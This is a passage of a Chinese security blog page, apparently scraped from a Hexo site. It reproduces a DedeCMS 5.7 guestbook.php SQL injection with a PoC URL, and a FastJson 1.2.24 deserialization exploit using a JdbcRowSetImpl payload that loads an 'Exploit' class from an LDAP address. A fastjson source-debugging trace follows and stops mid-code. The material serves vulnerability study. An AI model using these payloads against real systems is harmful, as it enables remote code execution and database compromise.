class="string">&#x27;ls&#x27;</span>&#125;,proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;).text)</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/DDCTF2020/" data-id="cku8j3fgc001hdan742rohydk" data-title="DDCTF2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-DedeCMS 5.7 plusguestbook.php注入漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">DedeCMS 5.7 plusguestbook.php注入漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="DedeCMS-5-7-plus-guestbook-php-注入漏洞"><a href="#DedeCMS-5-7-plus-guestbook-php-注入漏洞" class="headerlink" title="DedeCMS 5.7 plus/guestbook.php 注入漏洞"></a>DedeCMS 5.7 plus/guestbook.php 注入漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>漏洞成功需要条件：</p>
<ol>
<li>php magic_quotes_gpc=off</li>
<li>漏洞文件存在 plus/guestbook.php dede_guestbook 表当然也要存在。</li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>poc:<code>www.xxx.com/plus/guestbook.php?action=admin&amp;job=editok&amp;msg=sebug&#39;&amp;id=存在的留言ID</code></p>
<p><code>/plus/guestbook.php</code>中为对身份进行验证:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">include_once</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/guestbook/edit.inc.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>/plus/guestbook/edit.inc.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$job</span>==<span class="string">&#x27;editok&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$remsg</span> = trim(<span class="variable">$remsg</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$remsg</span>!=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//管理员回复不过滤HTML</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$g_isadmin</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;&lt;div class=\\&#x27;rebox\\&#x27;&gt;&quot;</span>.<span class="variable">$msg</span>.<span class="string">&quot;&lt;/div&gt;\n&quot;</span>.<span class="variable">$remsg</span>; </span><br><span class="line">            <span class="comment">//$remsg &lt;br&gt;&lt;font color=red&gt;管理员回复：&lt;/font&gt;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$dsql</span>-&gt;GetOne(<span class="string">&quot;SELECT msg From `#@__guestbook` WHERE id=&#x27;<span class="subst">$id</span>&#x27; &quot;</span>);</span><br><span class="line">            <span class="variable">$oldmsg</span> = <span class="string">&quot;&lt;div class=\\&#x27;rebox\\&#x27;&gt;&quot;</span>.addslashes(<span class="variable">$row</span>[<span class="string">&#x27;msg&#x27;</span>]).<span class="string">&quot;&lt;/div&gt;\n&quot;</span>;</span><br><span class="line">            <span class="variable">$remsg</span> = trimMsg(cn_substrR(<span class="variable">$remsg</span>, <span class="number">1024</span>), <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$msg</span> = <span class="variable">$oldmsg</span>.<span class="variable">$remsg</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">	<span class="variable">$msg</span> = HtmlReplace(<span class="variable">$msg</span>, -<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$dsql</span>-&gt;ExecuteNoneQuery(<span class="string">&quot;UPDATE `#@__guestbook` SET `msg`=&#x27;<span class="subst">$msg</span>&#x27;, `posttime`=&#x27;&quot;</span>.time().<span class="string">&quot;&#x27; WHERE id=&#x27;<span class="subst">$id</span>&#x27; &quot;</span>);</span><br><span class="line">    ShowMsg(<span class="string">&quot;成功更改或回复一条留言！&quot;</span>, <span class="variable">$GUEST_BOOK_POS</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$msg</span> = HtmlReplace(<span class="variable">$msg</span>, -<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$dsql</span>-&gt;ExecuteNoneQuery(<span class="string">&quot;UPDATE `#@__guestbook` SET `msg`=&#x27;<span class="subst">$msg</span>&#x27;, `posttime`=&#x27;&quot;</span>.time().<span class="string">&quot;&#x27; WHERE id=&#x27;<span class="subst">$id</span>&#x27; &quot;</span>);</span><br></pre></td></tr></table></figure>

<p>dedecms中的<code>common.inc.php</code>,有这样的一段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$_k</span> == <span class="string">&#x27;nvarname&#x27;</span>) $&#123;<span class="variable">$_k</span>&#125; = <span class="variable">$_v</span>;</span><br><span class="line">			<span class="keyword">else</span> $&#123;<span class="variable">$_k</span>&#125; = _RunMagicQuotes(<span class="variable">$_v</span>);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>它将<code>_GET</code>,<code>_POST</code>,<code>_COOKIE</code>中的变量放出来,而<code>_RunMagicQuotes</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_RunMagicQuotes</span>(<span class="params">&amp;<span class="variable">$svar</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$svar</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>所以<code>magic_quotes_gpc=off</code>的情况下便会引起sql注入</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-89599">https://www.seebug.org/vuldb/ssvid-89599</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cku8j3fge001mdan7f7vr9nbt" data-title="DedeCMS 5.7 plusguestbook.php注入漏洞" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-FastJson1.2.24调试记录_复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/">FastJson1.2.24调试记录_复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="FastJson1-2-23-反序列化复现"><a href="#FastJson1-2-23-反序列化复现" class="headerlink" title="FastJson1.2.23 反序列化复现"></a>FastJson1.2.23 反序列化复现</h1><p>漏洞exp:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt; var4)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;xterm&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String var0)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>FastJsonTest.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;autoCommit\&quot;:true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>一步一步跟进去在<br>parseObject:320, DefaultJSONParser (com.alibaba.fastjson.parser)<br>发现了关于@type的处理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    String typeName = lexer.scanSymbol(symbolTable, &#x27;&quot;&#x27;);</span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line">    return deserializer.deserialze(this, clazz, fieldName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟下去观察到是通过<code>Thread.currentThread().getContextClassLoader().loadClass(className);</code><br>来加载@type的对应的值<br>跟进config.getDeserializer(clazz);<br>最后是通过<code>derializer = createJavaBeanDeserializer(clazz, type);</code>来生成反序列化处理器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">public ObjectDeserializer createJavaBeanDeserializer(Class&lt;?&gt; clazz, Type type) &#123;</span><br><span class="line">        boolean asmEnable = this.asmEnable;//不是安卓设备则为true</span><br><span class="line">        if (asmEnable) &#123;</span><br><span class="line">            JSONType jsonType = clazz.getAnnotation(JSONType.class);</span><br><span class="line"></span><br><span class="line">            if (jsonType != null) &#123;//检测是否存在JSONType注释</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (asmEnable) &#123;</span><br><span class="line">                Class&lt;?&gt; superClass = JavaBeanInfo.getBuilderClass(jsonType);//传入null</span><br><span class="line">                if (superClass == null) &#123;</span><br><span class="line">                    superClass = clazz;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                for (;;) &#123;//检查clazz及其所有父类是否均为public</span><br><span class="line">                    if (!Modifier.isPublic(superClass.getModifiers())) &#123;</span><br><span class="line">                        asmEnable = false;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    superClass = superClass.getSuperclass();</span><br><span class="line">                    if (superClass == Object.class || superClass == null) &#123;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (clazz.getTypeParameters().length != 0) &#123;//没有使用泛型</span><br><span class="line">            asmEnable = false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (asmEnable &amp;&amp; asmFactory != null &amp;&amp; asmFactory.classLoader.isExternalClass(clazz)) &#123;</span><br><span class="line">            asmEnable = false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (asmEnable) &#123;//类名不存在.和不可见字符</span><br><span class="line">            asmEnable = ASMUtils.checkName(clazz.getSimpleName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (asmEnable) &#123;</span><br><span class="line">            if (clazz.isInterface()) &#123;</span><br><span class="line">                asmEnable = false;</span><br><span class="line">            &#125;</span><br><span class="line">            JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</span><br><span class="line"></span><br><span class="line">            if (asmEnable &amp;&amp; beanInfo.fields.length &gt; 200) &#123;</span><br><span class="line">                asmEnable = false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Constructor&lt;?&gt; defaultConstructor = beanInfo.defaultConstructor;</span><br><span class="line">            if (asmEnable &amp;&amp; defaultConstructor == null &amp;&amp; !clazz.isInterface()) &#123;</span><br><span class="line">                asmEnable = false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            for (FieldInfo fieldInfo : beanInfo.fields) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (asmEnable) &#123;</span><br><span class="line">            if (clazz.isMemberClass() &amp;&amp; !Modifier.isStatic(clazz.getModifiers())) &#123;</span><br><span class="line">                asmEnable = false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!asmEnable) &#123;</span><br><span class="line">            return new JavaBeanDeserializer(this, clazz, type);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</span><br><span class="line">        try &#123;</span><br><span class="line">            return asmFactory.createJavaBeanDeserializer(this, beanInfo);</span><br><span class="line">            // &#125; catch (VerifyError e) &#123;</span><br><span class="line">            // e.printStackTrace();</span><br><span class="line">            // return new JavaBeanDeserializer(this, clazz, type);</span><br><span class="line">        &#125; catch (NoSuchMethodException ex) &#123;</span><br><span class="line">            return new JavaBeanDeserializer(this, clazz, type);</span><br><span class="line">        &#125; catch (JSONException asmError) &#123;</span><br><span class="line">            return new JavaBeanDeserializer(this, beanInfo);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            throw new JSONException(&quot;create asm deserializer error, &quot; + clazz.getName(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>阅读代码发现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 不是安卓设备</span><br><span class="line">2. clazz是否存在JSONType注释</span><br><span class="line">3. clazz及其所有父类都是public</span><br><span class="line">4. clazz类的声明没有使用泛型</span><br><span class="line">5. clazz的类名不存在.</span><br></pre></td></tr></table></figure>
<p>经过上述检查后进入<code>JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public static JavaBeanInfo build(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy) &#123;</span><br><span class="line">    JSONType jsonType = clazz.getAnnotation(JSONType.class);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; builderClass = getBuilderClass(jsonType);</span><br><span class="line"></span><br><span class="line">    Field[] declaredFields = clazz.getDeclaredFields();//获取所有字段</span><br><span class="line">    Method[] methods = clazz.getMethods();//获取所有public方法</span><br><span class="line"></span><br><span class="line">    Constructor&lt;?&gt; defaultConstructor = getDefaultConstructor(builderClass == null ? clazz : builderClass);</span><br><span class="line">    Constructor&lt;?&gt; creatorConstructor = null;</span><br><span class="line">    Method buildMethod = null;</span><br><span class="line"></span><br><span class="line">    List&lt;FieldInfo&gt; fieldList = new ArrayList&lt;FieldInfo&gt;();</span><br><span class="line"></span><br><span class="line">    if (defaultConstructor == null &amp;&amp; !(clazz.isInterface() || Modifier.isAbstract(clazz.getModifiers()))) &#123;</span><br><span class="line">       ... </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (defaultConstructor != null) &#123;</span><br><span class="line">        TypeUtils.setAccessible(defaultConstructor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (builderClass != null) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (Method method : methods) &#123; //</span><br><span class="line">        int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;</span><br><span class="line">        String methodName = method.getName();</span><br><span class="line">        if (methodName.length() &lt; 4) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;//方法名大于4</span><br><span class="line"></span><br><span class="line">        if (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;//非静态方法</span><br><span class="line"></span><br><span class="line">        // support builder set</span><br><span class="line">        if (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;//返回值是void 或 clazz类</span><br><span class="line">        Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">        if (types.length != 1) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;//只有一个参数</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        if (!methodName.startsWith(&quot;set&quot;)) &#123; // TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？</span><br><span class="line">            continue;</span><br><span class="line">        &#125;//方法名以set开头</span><br><span class="line"></span><br><span class="line">        char c3 = methodName.charAt(3);</span><br><span class="line"></span><br><span class="line">        String propertyName;</span><br><span class="line">        if (Character.isUpperCase(c3) //set后的第一个字符必须是大写或_或f</span><br><span class="line">            || c3 &gt; 512 // for unicode method name</span><br><span class="line">        ) //获得set方法对应的字段</span><br><span class="line">        &#123;</span><br><span class="line">            if (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">                propertyName = TypeUtils.decapitalize(methodName.substring(3));</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (c3 == &#x27;_&#x27;) &#123;</span><br><span class="line">            propertyName = methodName.substring(4);</span><br><span class="line">        &#125; else if (c3 == &#x27;f&#x27;) &#123;</span><br><span class="line">            propertyName = methodName.substring(3);</span><br><span class="line">        &#125; else if (methodName.length() &gt;= 5 &amp;&amp; Character.isUpperCase(methodName.charAt(4))) &#123;</span><br><span class="line">            propertyName = TypeUtils.decapitalize(methodName.substring(3));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            